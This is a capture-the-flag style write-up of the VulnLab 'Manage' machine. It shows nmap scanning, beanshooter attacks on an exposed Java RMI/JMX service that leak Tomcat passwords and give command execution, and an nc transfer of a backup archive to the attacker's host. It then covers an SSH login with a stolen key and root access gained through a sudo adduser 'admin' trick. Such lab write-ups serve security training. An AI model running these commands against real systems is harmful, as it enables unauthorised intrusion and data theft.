---
title: Manage
date: 2026-01-27 15:56:29
categories: ["VulnLab"]
tags: ["Java RMI", "Information Disclosure", "Insecure User Permissions"]
cover: https://assets.vulnlab.com/manage_slide.png
---

# TLDR
Learn to enumerate the Java Remote Method Invocation (RMI) Framework and gain RCE on the target server.

# Enumeration
```bash
(jon@kali)-[~/vulnLab/easy/manage]$ sudo nmap -p- manage.vl
...
Nmap scan report for manage.vl (10.10.95.212)
Host is up (0.16s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
35221/tcp open  unknown
43123/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 366.82 seconds
```
- Nmap shows that ports 22, 2222, 8080, 35221 and 45123 are open.

```bash
(jon@kali)-[~/vulnLab/easy/manage]$ sudo nmap -p 22,2222,8080,35221,43123 -A manage.vl
...
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:f1:fa:bb:87:64 (ECDSA)
|   256 da:3b:11:08:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp  open  java-rmi   Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|   javax.management.remote.rmi.RMIServerImpl_Stub
|   @127.0.0.1:35221
|     extends
|       java.rmi.server.RemoteStub
|         extends
|           java.rmi.server.RemoteObject
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8080/tcp  open  http       Apache Tomcat 10.1.19
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/10.1.19
35221/tcp open  java-rmi   Java RMI
43123/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   184.22 ms 10.8.0.1
2   184.84 ms manage.vl (10.10.95.212)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.59 seconds
```
- With a more detailed Nmap scan, we see that SSH is running on port 22, Java-RMI is on 2222 and 35221, Apache Tomcat on 8080 and 43123 is protected by a TCP wrapper.

## SSH (22)
```bash
(jon㉿kali)-[~/vulnLab/easy/manage]$ ssh test@manage.vl
The authenticity of host 'manage.vl (10.10.95.212)' can't be established.
ED25519 key fingerprint is SHA256:mTJofQVp4T/1uO1CFsfPt8SADZfjbzIIynR0Zeqi0qo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes'
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'manage.vl' (ED25519) to the list of known hosts.
test@manage.vl: Permission denied (publickey).
```
- SSH password authentication is disabled.

## Apache Tomcat (8080)
### Dirsearch
```bash
(jon㉿kali)-[~/vulnLab/easy/manage]$ dirsearch -u http://manage.vl:8080
[12:30:43] Starting:
[12:31:37] 400 - 796B - /.\.\.\.\.\.\.\.\.\.\.\.\.\.\etc\passwd
[12:31:44] 400 - 796B - /a%5c.aspx
[12:33:48] 403 - 877B - /docs/
[12:33:48] 403 - 877B - /docs/_build/
[12:33:48] 403 - 877B - /docs/CHANGELOG.html
[12:33:48] 302 - 0B - /docs → /docs/
[12:33:48] 403 - 877B - /docs/html/index.html
[12:33:48] 403 - 877B - /docs/changelog.txt
...
[12:33:59] 403 - 865B - /examples/servlets/index.html
[12:34:01] 302 - 0B - /examples → /examples/
[12:34:01] 200 - 21KB - /favicon.ico
[12:34:15] 403 - 3KB - /host-manager/html
[12:34:16] 403 - 3KB - /host-manager/
[12:34:44] 302 - 0B - /manager → /manager/
```
- I got status code 302 for the `/examples`, `/docs`, and `/manager` directories.

### Website Features
![Apache Tomcat](\images\Manage\apache.png)
- Apache Tomcat v10.1.19 is running on `http://manage.vl:8080`.

![403 status code](\images\Manage\403.png)
- I got a 403 Forbidden response for the  `/examples`, `/docs`, and `/manager` directories.

## Java RMI (2222)
Java Remote Method Invocation (RMI) is a Java framework that allows code running on a machine to invoke methods on an object on another machine, almost like calling a local method. It’s Java’s built-in way of doing distributed computing and remote procedure calls. It uses TCP port 1099 by default, but DMI services can use any port.

```bash
(jon㉿kali)-[~/vulnLab/easy/manage]$ java -jar beanshooter enum manage.vl 2222
...
[+] Enumerating tomcat users:
[+]
[+] - Listing 2 tomcat users:
[+]
[+] ________________________________________
[+]
[+] Username: manager
[+] Password: fhErvo2r9wuTEYiYgt
[+] Roles: Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+] ________________________________________
[+]
[+] Username: admin
[+] Password: onyRPCkaG4iX72BrRtKgbszd
[+] Roles: Users:type=Role,rolename="role1",database=UserDatabase
[+]
```
- Using [qtc’s beanshooter tool](https://github.com/qtc-de/beanshooter) for Java Management Extension (JMX) enumeration and attacks, I found 2 Apache Tomcat users, their password and roles respectively.

```bash
# shell 1
[jon@kali]–[~/vulnLab/easy/manage]$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard manage.vl 2222 exec 'ping 10.8.7.230 -c5'
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+] Deploying MBean: StandardMBean
MBean with object name de.qtc.beanshooter:standard=57841476285643 was successfully deployed.
[+] Caught NullPointerException while invoking the newTransformer action.
This is expected behavior and the attack most likely worked :)
[+] Removing MBean with ObjectName de.qtc.beanshooter:standard=57841476285643 from the MBeanServer.
[+] MBean was successfully removed.
```
```bash
# shell 2
[jon@kali]–[~/vulnLab/easy/manage]$ sudo tcpdump -i tun0 icmp -v
[sudo] password for jon:
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:51:08.317450 IP (tos 0x0, ttl 63, id 48333, offset 0, flags [DF], proto ICMP (1), length 84)
    manage.vl > 10.8.7.230: ICMP echo request, id 1, seq 1, length 64
13:51:08.317465 IP (tos 0x0, ttl 64, id 34598, offset 0, flags [none], proto ICMP (1), length 84)
    10.8.7.230 > manage.vl: ICMP echo reply, id 1, seq 1, length 64
13:51:09.315093 IP (tos 0x0, ttl 63, id 48576, offset 0, flags [DF], proto ICMP (1), length 84)
```
- Beanshooter can be used to gain RCE on the target machine. Using `tcpdump` to listen for incoming ICMP packets, `manage.vl` could connect to my attack machine.

## Unknown (43123)
- Nothing interesting for this port from my Nmap scan results.

# Gaining a Foothold (RCE into `manage.vl`)
```bash
(jon㉿kali)-[~/vulnLab/easy/manage]$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard manage.vl 2222 tonka
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+] Deploying MBean: StandardMBean
    MBean with object name de.qtc.beanshooter:standard=58446734705054 was successfully deployed.
[+] Caught NullPointerException while invoking the newTransformer action.
    This is expected behavior and the attack most likely worked :)
[+] Removing MBean with ObjectName de.qtc.beanshooter:standard=58446734705054 from the MBeanServer.
    MBean was successfully removed.

(jon㉿kali)-[~/vulnLab/easy/manage]$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell manage.vl 2222
[tomcat@manage.vl /]$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
[tomcat@manage.vl /]$
```
- With connectivity between both machines, I gained remote access to `manage.vl` as a **tomcat** user. While beanshooter’s `standard` action can be used for RCE, it is blind and you won’t get the output of your netcat command. Additionally, your command is passed to `Runtime.exec(String str)`, which doesn’t support special shell features. As such, it’s recommended to use the `tonka` action for executing shells.

```bash
[tomcat@manage.vl/home]$ cd /home
[tomcat@manage.vl/home]$ ls
karl  useradmin
[tomcat@manage.vl/home]$ cd useradmin
[tomcat@manage.vl:/home/useradmin]$ ls
backups
[tomcat@manage.vl:/home/useradmin]$ cd backups
[tomcat@manage.vl:/home/useradmin/backups]$ ls
backup.tar.gz
```
- In the `/home/tomcat` directory, I found 2 more users, **karl** and **useradmin**. There wasn’t anything interesting in karl’s directory but I found a `backups.tar.gz` in useradmin’s directory.

```bash
# Downloading backup.tar.gz on Kali Linux

# on manage.vl
tomcat@manage.vl [/home/useradmin/backups]$ nc -vn 10.8.7.230 4444 < backup.tar.gz

# on Kali Linux
jon@kali:~/vulnLab/easy/manage$
$ nc -lnvp 4444 > backup.tar.gz
listening on [any] 4444 ...
connect to [10.8.7.230] from (UNKNOWN) [10.10.73.37] 38326
```
- Download the `backup.tar.gz` file on Kali Linux.

```bash
(jon@kali)-[~/vulnLab/easy/manage/backup]$ ls -la
total 32
drwxr-xr-x  4 1002 1002 4096 Jun 22  2024 .
drwxr-xr-x  6 1002 1002 4096 Jan 27 14:31 ..
lrwxrwxrwx  1 1002 1002   20 Jun 22  2024 .bash_history -> /dev/null
-rw-r--r--  1 1002 1002  220 Jun 21  2024 .bash_logout
-rw-r--r--  1 1002 1002 3771 Jun 21  2024 .bashrc
drwx------  2 1002 1002 4096 Jun 22  2024 .cache
-r--------  1 1002 1002   52 Jun 21  2024 .google_authenticator
-rw-r--r--  1 1002 1002  807 Jun 21  2024 .profile
drwxrwxr-x  2 1002 1002 4096 Jun 21  2024 .ssh

(jon@kali)-[~/vulnLab/easy/manage/backup]$ cd .ssh && ls -la
total 20
drwxrwxr-x  2 1002 1002 4096 Jun 21  2024 .
drwxr-xr-x  4 1002 1002 4096 Jun 22  2024 ..
-rw-r--r--  1 1002 1002  412 Jun 21  2024 authorized_keys
-rwx--x--x  1 1002 1002  411 Jun 21  2024 id_ed25519
-rw-r--r--  1 1002 1002   98 Jun 21  2024 id_ed25519.pub
```
- The `.ssh` directory was inside the `backups` folder. We can access the SSH private and public keys now.

```bash
(jon@kali)-[~/vulnLab/easy/manage/backup]$ sudo cat .google_authenticator
[sudo] password for jon: 
CLSSMHYGLENX5HAIFBQ6L35UM
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
<REDACTED>
```
- There’s also a `.google_authenticator` file which contains authentication codes. Thus hinting that MFA is used to facilitate the SSH authentication.

```bash
(jon@kali)-[~/vulnLab/easy/manage/backup]$ sudo ssh -i id_ed25519 useradmin@manage.vl
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

...

Last login: Fri Jun 21 16:48:53 2024 from 192.168.94.139
useradmin@manage:~$ whoami && hostname && id
useradmin
manage
uid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)
```
- Using sudo privileges, I set read permissions on the SSH private key and successfully RCE’d into `manage.vl` as **userasdmin** with his google authentication codes.

# Priv Esc
```bash
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
useradmin@manage:~$
```
- Checking if **useradmin** can run privileged commands, I noticed he can add users without a password. This means we can abuse his privileges to add a new user that we can control.
- The adduser command creates a new admin user and group during system initialization if no admin user or group exists. By default, Ubuntu has an admin group in the `/etc/sudoers` file, thus granting this group and user sudo privileges. When specifying a new user called “admin” in the user configuration, the system will automatically establish an admin user and group with elevated privileges.

```bash
useradmin@manage:~$ sudo adduser admin
Adding user `admin' ...
Adding new group `admin' (1003) ...
Adding new user `admin' (1003) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password:
Retype new password:
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
        Full Name []:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n] Y

useradmin@manage:~$ su admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:/home/useradmin$ sudo -l
[sudo] password for admin:
Matching Defaults entries for admin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on manage:
    (ALL : ALL) ALL

admin@manage:/home/useradmin$
```
- I created a user called **admin**. Upon switching to this new user, a message appears, saying that we can run commands as root using sudo. I confirmed this with the `sudo -l` command.

```bash
admin@manage:/home/useradmin$ sudo su root
root@manage:/home/useradmin# whoami
root
root@manage:/home/useradmin#
```
- With this, I successfully gained root access to the machine and found `root.txt`.

# References
1. [(Remo) VulnLab - Manage Writeup](https://remo1x.github.io/posts/Manage/)
2. [(n37ar) VulnLab - Manage Writeup](https://hackinghub.substack.com/p/managevulnlab-writeup)
3. [Beanshooter GitHub](https://github.com/qtc-de/beanshooter)